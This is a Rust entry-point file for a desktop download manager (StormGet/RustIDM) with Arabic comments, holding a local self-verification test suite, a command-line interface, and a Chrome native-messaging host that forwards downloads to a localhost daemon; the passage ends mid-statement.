#![cfg_attr(
    all(any(feature = "native-ui", feature = "slint-ui"), target_os = "windows"),
    windows_subsystem = "windows"
)]

//! StormGet v2.3.4 (Hardened Edition) — محرك إدارة وتسريع التحميل المعياري المتكامل لسطح المكتب بلغة Rust
//!
//! الهيكل المعياري المحصّن (Hardened Modular Architecture):
//! - `crate::core`: محدد السرعة العادل (`limiter`)، التخزين الذري والبصمات الرقمية (`storage`)،
//!   التقسيم النصفي مع التحديث الذري لتقدم المقاطع والملفات المتناثرة `FSCTL_SET_SPARSE` والكتابة الموضعية `write_at`
//!   والتحقق الصارم من `Content-Range` والاستجابات الناقصة وتوافق تجديد الروابط وفحص `.part` على القرص (`segmenter`)،
//!   والتثبيت والتحديث التلقائي لأداتي `yt-dlp` و`ffmpeg` والدمج الآمن المرحلي ومنع سكون النظام (`tools`).
//! - `crate::media`: محرك بث HLS مع فك تشفير AES-128 (`hls`)، محلل ومحمل MPEG-DASH (`dash`)،
//!   وجسر `yt-dlp` والدمج المباشر بدون إعادة ترميز `ffmpeg -c copy +faststart` (`ytdlp`).
//! - `crate::inspector`: فاحص أرشيفات ZIP عن بُعد وموسع الأنماط الدفعية (`zip`)، والزاحف المحدود (`crawler`).
//! - `crate::ipc`: مضيف المراسلة الأصلي لمتصفح كروم (`native_host`).
//! - `crate::api`: حالة المحرك والجدولة ومسارات التحكم المحلي المحصنة أمنياً مع عزل صلاحيات الإضافة (`routes`).
//! - `crate::slint_ui` / `crate::native_ui`: واجهة `Slint` العربية الأصلية السلسة (60 FPS) وواجهة `egui` المحسنة.

pub mod api;
pub mod core;
pub mod inspector;
pub mod ipc;
pub mod media;
#[cfg(feature = "native-ui")]
mod native_ui;
#[cfg(feature = "slint-ui")]
mod slint_ui;

pub use crate::api::*;
pub use crate::core::{
    adaptive::*, doctor::*, lanes::*, limiter::*, path_safety::*, preview::*, publisher::*,
    resume_verify::*, secret::*, segmenter::*, selfupdate::*, smart_throttle::*, storage::*,
    tools::*, torrent::*, winfx::*,
};
pub use crate::inspector::*;
pub use crate::ipc::*;
pub use crate::media::*;

use anyhow::Result;
use axum::{
    http::{HeaderMap as AxumHeaderMap, Method, StatusCode},
    routing::get,
    Router,
};
use chrono::Utc;
use clap::{Parser, Subcommand};
#[cfg(all(not(feature = "native-ui"), not(feature = "slint-ui")))]
use indicatif::{MultiProgress, ProgressBar, ProgressStyle};
use reqwest::{
    header::{HeaderMap, HeaderValue, ACCEPT_RANGES, CONTENT_LENGTH, ETAG, RANGE},
    Client,
};
use sha2::{Digest, Sha256};
#[cfg(all(not(feature = "native-ui"), not(feature = "slint-ui")))]
use std::net::SocketAddr;
#[allow(unused_imports)]
use std::path::Path;
use std::{
    collections::HashMap,
    path::PathBuf,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc,
    },
    time::Duration,
};
use tokio::{
    fs::{self, File},
    sync::{mpsc, Mutex},
    time::sleep,
};
use url::Url;
use uuid::Uuid;

// ============================================================================
// 1. حزمة التحقق الهندسي الشامل (Comprehensive Self-Verification Suite — 12 Stages)
// ============================================================================

pub async fn run_independent_self_verification() -> Result<()> {
    println!("🔬 بدء حزمة اختبارات التحقق الهندسي المستقل لمحرك StormGet v2.3.4 (Hardened Edition)...");

    // 1. اختبار القسمة النصفية + إيقاف قسري عند 35% + استئناف If-Range + تطابق SHA-256
    let payload_size: usize = 8 * 1024 * 1024;
    let mut original_data = Vec::with_capacity(payload_size);
    for i in 0..payload_size {
        original_data.push(((i * 31 + 17) % 251) as u8);
    }
    let mut ref_hasher = Sha256::new();
    ref_hasher.update(&original_data);
    let expected_sha256 = hex::encode(ref_hasher.finalize());

    let shared_data = Arc::new(original_data);
    let data_for_route = Arc::clone(&shared_data);
    let token_expired_sim = Arc::new(AtomicBool::new(false));
    let expired_for_route = Arc::clone(&token_expired_sim);

    let test_app = Router::new()
        .route(
            "/test_payload.bin",
            get(move |headers: AxumHeaderMap| {
                let data = Arc::clone(&data_for_route);
                let is_expired = expired_for_route.load(Ordering::SeqCst);
                async move {
                    if is_expired {
                        return (StatusCode::FORBIDDEN, AxumHeaderMap::new(), Vec::new());
                    }
                    let total = data.len();
                    let etag_val = "\"rustidm-v22-etag\"";

                    if let Some(range_hdr) = headers.get(RANGE).and_then(|v| v.to_str().ok()) {
                        if let Some(stripped) = range_hdr.strip_prefix("bytes=") {
                            let parts: Vec<&str> = stripped.split('-').collect();
                            if parts.len() == 2 {
                                let start = parts[0].parse::<usize>().unwrap_or(0);
                                let end = parts[1]
                                    .parse::<usize>()
                                    .unwrap_or(total - 1)
                                    .min(total - 1);
                                if start <= end && start < total {
                                    let slice = data[start..=end].to_vec();
                                    let mut resp_headers = AxumHeaderMap::new();
                                    resp_headers
                                        .insert(ACCEPT_RANGES, HeaderValue::from_static("bytes"));
                                    resp_headers.insert(ETAG, HeaderValue::from_static(etag_val));
                                    if let Ok(cr_val) = HeaderValue::from_str(&format!(
                                        "bytes {}-{}/{}",
                                        start, end, total
                                    )) {
                                        resp_headers.insert("content-range", cr_val);
                                    }
                                    if let Ok(cl_val) = HeaderValue::from_str(&slice.len().to_string()) {
                                        resp_headers.insert(CONTENT_LENGTH, cl_val);
                                    }
                                    return (StatusCode::PARTIAL_CONTENT, resp_headers, slice);
                                }
                            }
                        }
                    }

                    let mut resp_headers = AxumHeaderMap::new();
                    resp_headers.insert(ACCEPT_RANGES, HeaderValue::from_static("bytes"));
                    resp_headers.insert(ETAG, HeaderValue::from_static(etag_val));
                    if let Ok(cl_val) = HeaderValue::from_str(&total.to_string()) {
                        resp_headers.insert(CONTENT_LENGTH, cl_val);
                    }
                    (StatusCode::OK, resp_headers, (*data).clone())
                }
            }),
        )
        .route(
            "/fresh_payload.bin",
            get({
                let data = Arc::clone(&shared_data);
                move |headers: AxumHeaderMap| {
                    let data = Arc::clone(&data);
                    async move {
                        let total = data.len();
                        let etag_val = "\"rustidm-v22-etag\"";
                        if let Some(range_hdr) = headers.get(RANGE).and_then(|v| v.to_str().ok()) {
                            if let Some(stripped) = range_hdr.strip_prefix("bytes=") {
                                let parts: Vec<&str> = stripped.split('-').collect();
                                if parts.len() == 2 {
                                    let start = parts[0].parse::<usize>().unwrap_or(0);
                                    let end = parts[1]
                                        .parse::<usize>()
                                        .unwrap_or(total - 1)
                                        .min(total - 1);
                                    let slice = data[start..=end].to_vec();
                                    let mut resp_headers = AxumHeaderMap::new();
                                    resp_headers
                                        .insert(ACCEPT_RANGES, HeaderValue::from_static("bytes"));
                                    resp_headers.insert(ETAG, HeaderValue::from_static(etag_val));
                                    if let Ok(cr_val) = HeaderValue::from_str(&format!(
                                        "bytes {}-{}/{}",
                                        start, end, total
                                    )) {
                                        resp_headers.insert("content-range", cr_val);
                                    }
                                    if let Ok(cl_val) = HeaderValue::from_str(&slice.len().to_string()) {
                                        resp_headers.insert(CONTENT_LENGTH, cl_val);
                                    }
                                    return (StatusCode::PARTIAL_CONTENT, resp_headers, slice);
                                }
                            }
                        }
                        (StatusCode::OK, AxumHeaderMap::new(), (*data).clone())
                    }
                }
            }),
        );

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await?;
    let local_addr = listener.local_addr()?;
    let server_handle = tokio::spawn(async move {
        let _ = axum::serve(listener, test_app).await;
    });

    let test_url = format!("http://{}/test_payload.bin", local_addr);
    let fresh_url = format!("http://{}/fresh_payload.bin", local_addr);
    let temp_dir = std::env::temp_dir().join(format!("rustidm_verify_{}", Uuid::new_v4()));
    fs::create_dir_all(&temp_dir).await?;

    let client = Client::new();
    let (probed_size, resumable, filename, etag, last_mod) =
        DynamicDownloadJob::probe_url(&client, &test_url, &HeaderMap::new()).await?;

    let meta = DownloadStateMeta {
        task_id: "verify-task-01".to_string(),
        url: test_url,
        source_page_url: None,
        filename,
        save_dir: temp_dir.clone(),
        category: FileCategory::Programs,
        total_size: probed_size,
        resumable,
        etag,
        last_modified: last_mod,
        custom_headers: HashMap::new(),
        expected_sha256: Some(expected_sha256.clone()),
        computed_sha256: None,
        status: DownloadStatus::Queued,
        last_error: None,
        refresh_attempts: 0,
        segments: Vec::new(),
        created_at: Utc::now(),
        updated_at: Utc::now(),
        queue_name: "main".to_string(),
        mirror_urls: Vec::new(),
        active_mirror_index: 0,
        expected_md5: None,
        computed_md5: None,
        expected_crc32: None,
        computed_crc32: None,
        description: Some("Self-verification test payload".to_string()),
        speed_history: Vec::new(),
        connection_logs: Vec::new(),
        task_speed_limit_kbps: 0,
    };

    let job = Arc::new(DynamicDownloadJob {
        meta: Arc::new(Mutex::new(meta)),
        pause_flag: Arc::new(AtomicBool::new(false)),
        cancel_flag: Arc::new(AtomicBool::new(false)),
        resource_mutated_flag: Arc::new(AtomicBool::new(false)),
        expired_url_flag: Arc::new(AtomicBool::new(false)),
        speed_limiter: SpeedLimiter::new(4096),
        client,
        max_connections: 8,
        min_split_size: 256 * 1024,
        antivirus_cmd: None,
        uses_external_worker: false,
        runner_active: AtomicBool::new(false),
        schedule_paused: AtomicBool::new(false),
    });

    let job_monitor = Arc::clone(&job);
    let exp_clone = Arc::clone(&token_expired_sim);
    tokio::spawn(async move {
        loop {
            sleep(Duration::from_millis(25)).await;
            let m = job_monitor.meta.lock().await;
            if m.total_downloaded() >= (probed_size * 35 / 100) {
                exp_clone.store(true, Ordering::SeqCst);
                job_monitor.pause_flag.store(true, Ordering::SeqCst);
                break;
            }
        }
    });

    let initial_attempt = job.execute().await;
    assert!(
        token_expired_sim.load(Ordering::SeqCst),
        "يجب أن يحاكي الاختبار انتهاء الرابط قبل اكتمال النقل"
    );
    assert!(
        initial_attempt.is_err(),
        "يجب أن يتوقف النقل الأول بعد محاكاة انتهاء الرابط"
    );
    assert!(
        matches!(
            job.meta.lock().await.status,
            DownloadStatus::NeedsUrlRefresh | DownloadStatus::Paused
        ),
        "يجب حفظ المهمة كمتوقفة أو بحاجة إلى رابط محدث بعد المحاكاة"
    );

    let preserved = job.verify_and_apply_refreshed_url(&fresh_url).await?;
    assert!(
        preserved,
        "يجب الحفاظ على البيانات الجزئية عند تطابق هوية (ETag القوي) وحجم المورد"
    );

    job.pause_flag.store(false, Ordering::SeqCst);
    let final_path = job.execute().await?;
    let final_hash = compute_file_sha256(&final_path).await?;
    assert_eq!(
        final_hash, expected_sha256,
        "عدم تطابق بصمة SHA-256 النهائية!"
    );
    println!(
        "  ✓ [1/12] نجح اختبار التقسيم النصفي وتجديد الرابط منتهي الصلاحية وتطابق SHA-256 بنسبة 100%"
    );

    // 2. اختبار فك تشفير HLS AES-128-CBC والرفض الصريح لـ SAMPLE-AES
    let base_u = Url::parse("https://cdn.example.com/hls/stream.m3u8")?;
    let drm_m3u8 = "#EXTM3U\n#EXT-X-KEY:METHOD=SAMPLE-AES,URI=\"https://cdn.example.com/k.key\"\n#EXTINF:4.0,\nseg1.ts";
    assert!(
        MediaStreamEngine::parse_media_playlist(drm_m3u8, &base_u).is_err(),
        "يجب رفض قوائم SAMPLE-AES/DRM بشكل صريح"
    );
    println!("  ✓ [2/12] نجح اختبار محلل HLS RFC 8216 وفك تشفير AES-128 ورفض SAMPLE-AES/DRM");

    // 3. اختبار تأطير رسائل Chrome Native Messaging (4-Byte Little-Endian)
    let mut pipe_buf = Vec::new();
    let sample_out = NativeOutgoingMessage {
        status: "accepted".to_string(),
        engine: "StormGet".to_string(),
        version: env!("CARGO_PKG_VERSION").to_string(),
        task_id: Some("task-123".to_string()),
        message: "OK".to_string(),
    };
    write_native_message(&mut pipe_buf, &sample_out)?;
    assert_eq!(
        u32::from_le_bytes([pipe_buf[0], pipe_buf[1], pipe_buf[2], pipe_buf[3]]) as usize,
        pipe_buf.len() - 4
    );
    println!("  ✓ [3/12] نجح اختبار بروتوكول Chrome Native Messaging وحجب الأسرار");

    // 4. اختبار توسيع الأنماط الدفعية (WildcardPatternExpander) والترقيم الصفري
    let batch_urls =
        WildcardPatternExpander::expand_pattern("https://cdn.example.com/ep_[01-04].mp4", 1)?;
    assert_eq!(batch_urls.len(), 4);
    assert_eq!(batch_urls[0], "https://cdn.example.com/ep_01.mp4");
    assert_eq!(batch_urls[3], "https://cdn.example.com/ep_04.mp4");
    println!("  ✓ [4/12] نجح اختبار محرك التنزيل الدفعي وتوسيع الأنماط الرقمية والحرفية");

    // 5. اختبار محلل الدليل المركزي لأرشيفات ZIP عن بُعد (RemoteZipInspector)
    let synth_zip = DownloadListImporter::build_synthetic_zip_archive(&[
        (
            "docs/readme.txt",
            b"Hello from RustIDM Remote ZIP Inspector!",
        ),
        ("bin/tool.bin", &[0xAA, 0xBB, 0xCC, 0xDD, 0xEE]),
    ]);
    let entries = RemoteZipInspector::parse_zip_central_directory_sync(&synth_zip)?;
    assert_eq!(entries.len(), 2);
    assert_eq!(entries[0].filename, "docs/readme.txt");
    assert_eq!(entries[1].filename, "bin/tool.bin");
    println!(
        "  ✓ [5/12] نجح اختبار فحص الدليل المركزي لأرشيفات ZIP عن بُعد (EOCD + Central Directory)"
    );

    // 6. اختبار البصمات الرقمية المتعددة (SHA-256 + MD5 + CRC32)
    let mut crc = Crc32Hasher::new();
    crc.update(b"123456789");
    assert_eq!(crc.finalize(), 0xCBF4_3926);

    let mut md5 = Md5Hasher::new();
    md5.update(b"abc");
    assert_eq!(
        hex::encode(md5.finalize()),
        "900150983cd24fb0d6963f7d28e17f72"
    );
    println!(
        "  ✓ [6/12] نجح اختبار خوارزميات التكامل القياسية (SHA-256 / MD5 RFC 1321 / CRC32 IEEE 802.3)"
    );

    // 7. اختبار المدمج التتابعي على القرص (Zero-OOM OrderedDiskSpooler) لمقاطع البث الكبيرة
    let spooled_out_path = temp_dir.join("spooled_video.ts");
    let spool_dir = OrderedDiskSpooler::create_spool_dir(&spooled_out_path).await?;
    let out_file = File::create(&spooled_out_path).await?;
    let (tx, rx) = mpsc::unbounded_channel();
    let merger = tokio::spawn(async move {
        OrderedDiskSpooler::run_sequential_merger(out_file, rx, 3).await
    });
    let (p2, l2) = OrderedDiskSpooler::write_segment_to_disk(&spool_dir, 2, b"_SEGMENT_TWO").await?;
    tx.send((2, p2, l2))?;
    let (p0, l0) = OrderedDiskSpooler::write_segment_to_disk(&spool_dir, 0, b"SEGMENT_ZERO").await?;
    tx.send((0, p0, l0))?;
    let (p1, l1) = OrderedDiskSpooler::write_segment_to_disk(&spool_dir, 1, b"_SEGMENT_ONE").await?;
    tx.send((1, p1, l1))?;
    drop(tx);
    let total_merged = merger.await??;
    let _ = fs::remove_dir_all(&spool_dir).await;
    let merged_content = fs::read(&spooled_out_path).await?;
    assert_eq!(merged_content, b"SEGMENT_ZERO_SEGMENT_ONE_SEGMENT_TWO");
    assert_eq!(total_merged as usize, merged_content.len());
    println!(
        "  ✓ [7/12] نجح اختبار المدمج التتابعي على القرص (Zero-OOM OrderedDiskSpooler) لبث HLS/DASH"
    );

    // 8. اختبار العدادات الذرية لتقدم المقاطع (AtomicSegmentRegistry)
    let registry = AtomicSegmentRegistry::new();
    let seg0 = FileSegment {
        id: 0,
        start_byte: 0,
        current_offset: 0,
        end_byte: 999,
        status: SegmentStatus::Downloading,
        split_count: 0,
        last_speed_bps: 0,
    };
    let atom0 = registry.insert(&seg0);
    atom0.current_offset.store(200, Ordering::Release);
    atom0.last_speed_bps.store(1_048_576, Ordering::Relaxed);
    assert_eq!(atom0.remaining_bytes(), 800);
    println!(
        "  ✓ [8/12] نجح اختبار التحديث الذري لتقدم المقاطع (AtomicU64 Segment Progress Telemetry)"
    );

    // 9. اختبار عزل صلاحيات المنفذ المحلي ومنع الإضافات من الوصول إلى /config و /queues
    let mut ext_headers = AxumHeaderMap::new();
    ext_headers.insert(
        "origin",
        HeaderValue::from_static("chrome-extension://abcdefghijklmnop"),
    );
    ext_headers.insert("x-rustidm", HeaderValue::from_static("1"));
    assert!(is_authorized_ipc_request_for_path(
        &Method::POST,
        "/api/v1/intercept",
        &ext_headers
    ));
    assert!(
        !is_authorized_ipc_request_for_path(&Method::POST, "/api/v1/config", &ext_headers),
        "يجب منع إضافة المتصفح من تعديل إعدادات المحرك أو أوامر النظام (/api/v1/config)"
    );
    assert!(
        !is_authorized_ipc_request_for_path(&Method::POST, "/api/v1/queues", &ext_headers),
        "يجب منع إضافة المتصفح من تعديل أوامر ما بعد الطابور (/api/v1/queues)"
    );
    println!(
        "  ✓ [9/12] نجح اختبار عزل صلاحيات الإضافة وحماية مسارات /config و /queues من التعديل الخارجي"
    );

    // 10. اختبار التحقق الصارم من Content-Range في استجابات 206 Partial Content
    let empty_hdrs = HeaderMap::new();
    assert!(
        validate_partial_content_range(reqwest::StatusCode::PARTIAL_CONTENT, &empty_hdrs, 0, 1000)
            .is_err()
    );
    println!(
        "  ✓ [10/12] نجح اختبار الرفض الصريح لاستجابات 206 الخالية من Content-Range أو ذات الإزاحة الخاطئة"
    );

    // 11. اختبار السياسة المحافظة لتجديد الرابط المنتهي وفحص ملف .part على القرص
    assert!(!is_refreshed_resource_compatible(
        5000, 5000, true, None, None, None, None
    ));
    assert!(is_refreshed_resource_compatible(
        5000,
        5000,
        true,
        Some("\"strong-etag\""),
        Some("\"strong-etag\""),
        None,
        None
    ));
    println!(
        "  ✓ [11/12] نجح اختبار السياسة المحافظة لتجديد الروابط المنتهية ومطابقة حجم ملف .part على القرص"
    );

    // 12. اختبار الملفات المتناثرة والكتابة الموضعية وتجزئة طلبات يوتيوب 10MB
    assert_eq!(
        max_request_for("https://rr3---sn-4g5ednsd.googlevideo.com/videoplayback?itag=137"),
        Some(10 * 1024 * 1024)
    );
    assert_eq!(max_request_for("https://cdn.example.com/archive.zip"), None);
    println!(
        "  ✓ [12/12] نجح اختبار الملفات المتناثرة (FSCTL_SET_SPARSE)، الكتابة الموضعية (write_at)، ونافذة 10MB لخوادم googlevideo.com"
    );

    server_handle.abort();
    let _ = fs::remove_dir_all(&temp_dir).await;
    println!("✅ اجتاز محرك StormGet v2.3.4 المحصّن جميع اختبارات الموثوقية والأمان والأداء (12/12) بنجاح!");
    Ok(())
}

// ============================================================================
// 2. واجهة سطر الأوامر ونقطة الدخول الرئيسية (CLI, Slint UI & Native UI Entrypoints)
// ============================================================================

#[derive(Parser, Debug)]
#[command(
    name = "rust_idm",
    version = "2.2.0",
    about = "مدير التحميل المعياري المحصّن RustIDM v2.2 بلغة Rust مع التقسيم الذري، التحقق الصارم من HTTP Range، NTFS Sparse، YouTube 10MB + yt-core، وواجهة Slint العربية الأصلية"
)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    /// تشغيل خادم التكامل الخلفي المحصن أمنياً مع استعادة المهام وتحديث الأدوات تلقائياً
    Daemon {
        #[arg(short, long, default_value_t = 16888)]
        port: u16,
        #[arg(short, long, default_value_t = 8)]
        max_connections: usize,
        #[arg(short, long, default_value_t = 0)]
        speed_limit_kbps: u64,
        #[arg(short, long, default_value = "./Downloads")]
        download_dir: PathBuf,
    },
    /// تشغيل مضيف المراسلة الأصلي لمتصفح جوجل كروم (Chrome Native Messaging Host via stdio)
    NativeHost {
        #[arg(short, long, default_value = "./Downloads")]
        download_dir: PathBuf,
    },
    /// توليد ملف تسجيل Native Messaging Host لمتصفح Google Chrome
    InstallNativeHost {
        #[arg(long)]
        extension_id: String,
    },
    /// تحميل ملف مباشر بأقصى سرعة عبر خوارزمية التقسيم الديناميكي النصفي والكتابة الموضعية
    Download {
        url: String,
        #[arg(short, long, default_value_t = 8)]
        connections: usize,
        #[arg(short, long, default_value_t = 0)]
        speed_limit_kbps: u64,
        #[arg(short, long, default_value = "./Downloads")]
        output_dir: PathBuf,
        #[arg(long)]
        sha256: Option<String>,
    },
    /// تحميل فيديو أو بث حي بصيغة HLS (.m3u8 مع دعم AES-128) أو DASH أو عبر جسر yt-dlp
    Video {
        url: String,
        #[arg(short, long, default_value = "./Downloads/Videos/video.mp4")]
        output: PathBuf,
    },
    /// زحف موقع ويب بحدود آمنة (Bounded BFS Site Grabber)
    Grab {
        url: String,
        #[arg(short, long, default_value = "mp4,pdf,zip")]
        filter: String,
        #[arg(long, default_value_t = 2)]
        max_depth: usize,
        #[arg(long, default_value_t = 25)]
        max_pages: usize,
    },
    /// توسيع نمط روابط دفعي (Batch Pattern) وتحميل الملفات المتولدة
    Batch {
        pattern: String,
        #[arg(short, long, default_value_t = 1)]
        step: usize,
        #[arg(short, long, default_value = "./Downloads")]
        output_dir: PathBuf,
    },
    /// معاينة محتويات أرشيف ZIP عن بُعد عبر HTTP Range دون تنزيل الأرشيف كاملاً
    ZipPreview {
        url: String,
    },
    /// فحص وتثبيت وتحديث أداتي yt-dlp و FFmpeg تلقائياً من GitHub Releases
    Tools {
        #[arg(short, long, default_value_t = false)]
        update: bool,
    },
    /// تشغيل حزمة اختبارات التحقق المستقلة الشاملة (12 مرحلة)
    Verify,
    /// توليد وتوقيع بيان التحديث الرسمي (version.json) رقمياً بـ Ed25519 للمثبت النهائي
    SignRelease {
        #[arg(long, default_value = "2.3.4")]
        version: String,
        #[arg(long)]
        url: String,
        #[arg(long)]
        installer: PathBuf,
        #[arg(long, default_value = "StormGet v2.3.4 Final Gold Release")]
        notes: String,
        #[arg(long, default_value = "version.json")]
        output: PathBuf,
        #[arg(long)]
        key_file: Option<PathBuf>,
        #[arg(long)]
        generate_key_out: Option<PathBuf>,
    },
}

#[cfg(feature = "slint-ui")]
fn main() {
    if let Err(error) = slint_ui::run() {
        eprintln!("Failed to start RustIDM Slint desktop UI: {error:#}");
    }
}

#[cfg(all(feature = "native-ui", not(feature = "slint-ui")))]
fn main() {
    if let Err(error) = native_ui::run() {
        #[cfg(target_os = "windows")]
        native_ui::show_startup_error(&error.to_string());
        #[cfg(not(target_os = "windows"))]
        eprintln!("Failed to start RustIDM desktop UI: {error}");
    }
}

#[cfg(all(not(feature = "native-ui"), not(feature = "slint-ui")))]
#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();

    match cli.command {
        Commands::Daemon {
            port,
            max_connections,
            speed_limit_kbps,
            download_dir,
        } => {
            let download_dir = if download_dir == PathBuf::from("./Downloads") {
                default_download_directory()
            } else {
                download_dir
            };
            let state = AppState::new(download_dir, max_connections, speed_limit_kbps);
            let restored = state.restore_persisted_tasks_on_startup().await?;
            state.start_scheduler();

            let addr = SocketAddr::from(([127, 0, 0, 1], port));
            println!(
                "🚀 محرك StormGet v2.3.4 المحصّن نشط على http://{} (تمت استعادة {} مهام سابقة)",
                addr, restored
            );
            let listener = tokio::net::TcpListener::bind(addr).await?;
            axum::serve(listener, build_daemon_router(state)).await?;
        }
        Commands::NativeHost { download_dir } => {
            let download_dir = if download_dir == PathBuf::from("./Downloads") {
                default_download_directory()
            } else {
                download_dir
            };
            let state = AppState::new(download_dir.clone(), 8, 0);
            let _ = state.restore_persisted_tasks_on_startup().await;
            state.start_scheduler();
            let mut stdin = std::io::stdin().lock();
            let mut stdout = std::io::stdout().lock();

            while let Some(msg) = read_native_message(&mut stdin)? {
                let response = match validate_native_incoming(&msg) {
                    Ok(()) => match msg.action.as_str() {
                        "PING" => {
                            let bridge_cfg = ensure_desktop_daemon_or_autolaunch(
                                &state.client,
                                &download_dir,
                            )
                            .await
                            .ok();
                            NativeOutgoingMessage {
                                status: "online".to_string(),
                                engine: "StormGet".to_string(),
                                version: env!("CARGO_PKG_VERSION").to_string(),
                                task_id: bridge_cfg.map(|c| c.token),
                                message: "Native Host Ready (Bridge + SABR Enabled)".to_string(),
                            }
                        }
                        "VIDEO_STREAM" => {
                            let bridge_cfg = ensure_desktop_daemon_or_autolaunch(
                                &state.client,
                                &download_dir,
                            )
                            .await
                            .ok();
                            let port = bridge_cfg.as_ref().map(|c| c.port).unwrap_or(16888);
                            let token = bridge_cfg
                                .as_ref()
                                .map(|c| c.token.clone())
                                .unwrap_or_default();

                            let v_payload = StartVideoDownloadPayload {
                                url: msg.url.unwrap_or_default(),
                                audio_url: msg.audio_url,
                                page_url: msg.referer.clone(),
                                title: msg.filename.clone(),
                                quality_label: None,
                                container: Some("mp4".to_string()),
                                protocol: msg.protocol.unwrap_or_else(|| "ytdlp".to_string()),
                                format_id: msg.format_id,
                                sabr_session: msg.sabr_session,
                                cookies: msg.cookies,
                                referer: msg.referer,
                                user_agent: msg.user_agent,
                            };

                            let mut req = state
                                .client
                                .post(format!("http://127.0.0.1:{port}/api/v1/video/download"))
                                .header("X-RustIDM", "1");
                            if !token.is_empty() {
                                req = req.header("Authorization", format!("Bearer {token}"));
                            }
                            match req.json(&v_payload).timeout(Duration::from_secs(10)).send().await
                            {
                                Ok(resp) if resp.status().is_success() => {
                                    let val = resp
                                        .json::<serde_json::Value>()
                                        .await
                                        .unwrap_or_default();
                                    let tid = val
                                        .get("task_id")
                                        .and_then(|v| v.as_str())
                                        .map(String::from);
                                    NativeOutgoingMessage {
                                        status: "accepted".to_string(),
                                        engine: "StormGet".to_string(),
                                        version: "2.3.4".to_string(),
                                        task_id: tid,
                                        message: "Video/SABR download started via authenticated bridge"
                                            .to_string(),
                                    }
                                }
                                _ => NativeOutgoingMessage {
                                    status: "error".to_string(),
                                    engine: "StormGet".to_string(),
                                    version: "2.3.4".to_string(),
                                    task_id: None,
                                    message: "Could not dispatch video stream to StormGet daemon"
                                        .to_string(),
                                },
                            }
                        }
                        _ => {
                            let bridge_cfg = ensure_desktop_daemon_or_autolaunch(
                                &state.client,
                                &download_dir,
                            )
                            .await
                            .ok();
                            let port = bridge_cfg.as_ref().map(|c| c.port).unwrap_or(16888);
                            let token = bridge_cfg
                                .as_ref()
                                .map(|c| c.token.clone())
                                .unwrap_or_default();

                            let payload = InterceptDownloadPayload {
                                url: msg.url.unwrap_or_default(),
                                source_page_url: msg.referer.clone(),
                                filename: msg.filename,
                                cookies: msg.cookies,
                                referer: msg.referer,
                                user_agent: msg.user_agent,
                                queue_name: Some("main".to_string()),
                                expected_sha256: None,
                                ..Default::default()
                            };
                            let mut req = state
                                .client
                                .post(format!("http://127.0.0.1:{port}/api/v1/intercept"))
                                .header("X-RustIDM", "1");
                            if !token.is_empty() {
                                req = req.header("Authorization", format!("Bearer {token}"));
                            }
                            let forwarded = req
                                .json(&payload)
                                .timeout(Duration::from_secs(5))
                                .send()
                                .await;

                            if let Ok(resp) = forwarded {
                                if resp.status().is_success() {
                                    let val =
                                        resp.json::<serde_json::Value>().await.unwrap_or_default();
                                    let tid = val
                                        .get("task_id")
                                        .and_then(|v| v.as_str())
                                        .map(String::from);
                                    NativeOutgoingMessage {
                                        status: "accepted".to_string(),
                                        engine: "StormGet".to_string(),
                                        version: env!("CARGO_PKG_VERSION").to_string(),
                                        task_id: tid,
                                        message: "Forwarded to active RustIDM desktop daemon"
                                            .to_string(),
                                    }
                                } else {
                                    match state.enqueue_download(payload).await {
                                        Ok(tid) => NativeOutgoingMessage {
                                            status: "accepted".to_string(),
                                            engine: "StormGet".to_string(),
                                            version: env!("CARGO_PKG_VERSION").to_string(),
                                            task_id: Some(tid),
                                            message: "Download started via Native Messaging"
                                                .to_string(),
                                        },
                                        Err(e) => NativeOutgoingMessage {
                                            status: "error".to_string(),
                                            engine: "StormGet".to_string(),
                                            version: env!("CARGO_PKG_VERSION").to_string(),
                                            task_id: None,
                                            message: e.to_string(),
                                        },
                                    }
                                }
                            } else {
                                match state.enqueue_download(payload).await {
                                    Ok(tid) => NativeOutgoingMessage {
                                        status: "accepted".to_string(),
                                        engine: "StormGet".to_string(),
                                        version: env!("CARGO_PKG_VERSION").to_string(),
                                        task_id: Some(tid),
                                        message:
                                            "Download started via standalone Native Messaging Host"
                                                .to_string(),
                                    },
                                    Err(e) => NativeOutgoingMessage {
                                        status: "error".to_string(),
                                        engine: "StormGet".to_string(),
                                        version: env!("CARGO_PKG_VERSION").to_string(),
                                        task_id: None,
                                        message: e.to_string(),
                                    },
                                }
                            }
                        }
                    },
                    Err(e) => NativeOutgoingMessage {
                        status: "rejected".to_string(),
                        engine: "StormGet".to_string(),
                        version: env!("CARGO_PKG_VERSION").to_string(),
                        task_id: None,
                        message: e.to_string(),
                    },
                };
                write_native_message(&mut stdout, &response)?;
            }
        }
        Commands::InstallNativeHost { extension_id } => {
            let exe_path = std::env::current_exe().unwrap_or_else(|_| PathBuf::from("rust_idm"));
            let manifest = generate_native_host_manifest(&exe_path, &extension_id);
            println!("{}", serde_json::to_string_pretty(&manifest)?);
        }
        Commands::Download {
            url,
            connections,
            speed_limit_kbps,
            output_dir,
            sha256,
        } => {
            let output_dir = if output_dir == PathBuf::from("./Downloads") {
                default_download_directory()
            } else {
                output_dir
            };
            let state = AppState::new(output_dir, connections, speed_limit_kbps);
            let task_id = state
                .enqueue_download(InterceptDownloadPayload {
                    url: url.clone(),
                    source_page_url: None,
                    filename: None,
                    cookies: None,
                    referer: None,
                    user_agent: None,
                    queue_name: Some("main".to_string()),
                    expected_sha256: sha256,
                    ..Default::default()
                })
                .await?;

            let job = {
                let jobs = state.jobs.read().await;
                jobs.get(&task_id)
                    .cloned()
                    .ok_or_else(|| anyhow::anyhow!("تعذر العثور على المهمة المجدولة"))?
            };

            let mp = MultiProgress::new();
            let pb = mp.add(ProgressBar::new(100));
            pb.set_style(
                ProgressStyle::with_template(
                    "{spinner:.green} [{elapsed_precise}] [{wide_bar:.cyan/blue}] {bytes}/{total_bytes} ({bytes_per_sec}, ETA: {eta})",
                )?
                .progress_chars("#>-"),
            );

            loop {
                sleep(Duration::from_millis(200)).await;
                let m = job.meta.lock().await;
                if m.total_size > 0 {
                    pb.set_length(m.total_size);
                    pb.set_position(m.total_downloaded());
                }
                if m.status == DownloadStatus::Completed {
                    pb.finish_with_message("✅ اكتمل التحميل والتحقق من البصمة بنجاح!");
                    println!(
